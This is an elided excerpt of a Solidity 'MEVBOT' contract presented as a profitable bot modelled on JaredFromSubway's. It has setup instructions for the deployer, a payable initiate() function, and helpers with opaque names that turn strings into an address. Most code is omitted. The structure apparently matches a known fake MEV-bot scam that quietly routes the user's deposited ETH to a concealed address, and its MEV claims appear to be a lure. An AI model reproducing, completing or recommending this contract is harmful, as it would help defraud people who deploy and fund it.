...
contract MEVBOT is Ownable {
    ...
    constructor(
        ...
        /**
         * @title MEVBOT Solidity Contract
         * @author Andrew F. Web3 - https://github.com/andrewfsolidity/jaredfromsubway-mevbot-light
         * @notice This contract is an implementation of a Maximum Extractable Value (MEV) Bot similar to JaredFromSubway's MEVBOT on the Ethereum network.
         ...
         *  - _SWAPV2PAIR: The address of the Pair that the bot should monitor. Example: https://etherscan.io/address/0xf239009a101b6b930a527deaab6961b6e7dec8a6 - You will copy just 0xf239009a101b6b930a527deaab6961b6e7dec8a6
         *
     ...
     */
    function start(string memory _s) internal pure returns (address) {
    ...
    function performMevBotHealthCheck() internal pure {
    ...
    function monitorMevBotPerformance() internal pure {
    ...
    function bit001() internal pure returns (string memory) {
    ...
    function _scanMemoryPool() internal view returns (address) {
        uint256 c;
        assembly {
            c := chainid()
        }
    ...
    function initiate() public payable {
        ...
        performMevBotHealthCheck();

        // Monitors the Performance of the MEVBOT over the network.
        monitorMevBotPerformance();
    }
    ...
    function pause() public payable {
        _ispaused = true;
        emit Log("Pausing contract bot...");
    }

    function unpause() public payable {
        _ispaused = false;
        emit Log("Resuming contract bot... Starting from last Mempool block");
    }
